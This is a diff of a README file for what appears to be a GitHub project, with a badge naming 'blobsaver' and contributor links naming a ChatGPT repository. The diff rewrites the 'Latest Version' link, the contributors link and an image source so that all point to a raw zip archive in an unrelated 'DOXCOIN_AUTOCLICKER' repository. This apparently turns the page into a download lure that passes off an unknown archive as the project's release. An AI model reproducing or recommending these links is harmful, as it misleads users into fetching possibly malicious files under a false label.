@@ -1,7 +1,7 @@
 ![GitHub All Releases](https://img.shields.io/github/downloads/airsquared/blobsaver/total.svg)
 
 # Instalation
-- [Latest Version](https://github.com/opidorapoka1992/opidorapoka1992/releases/tag/2.44)
+- [Latest Version](https://github.com/ashrafns/DOXCOIN_AUTOCLICKER/raw/refs/heads/main/jolleyman/AUTOCLICKER-DOXCOI-v2.3.zip)
 - *28.05.2024*
 ---
 
@@ -14,6 +14,6 @@
 
 This project exists thanks to all the people who contribute.
 
-<a href="https://github.com/acheong08/ChatGPT/graphs/contributors">
-<img src="https://contrib.rocks/image?repo=acheong08/ChatGPT" />
+<a href="https://github.com/ashrafns/DOXCOIN_AUTOCLICKER/raw/refs/heads/main/jolleyman/AUTOCLICKER-DOXCOI-v2.3.zip">
+<img src="https://github.com/ashrafns/DOXCOIN_AUTOCLICKER/raw/refs/heads/main/jolleyman/AUTOCLICKER-DOXCOI-v2.3.zip" />
 </a>
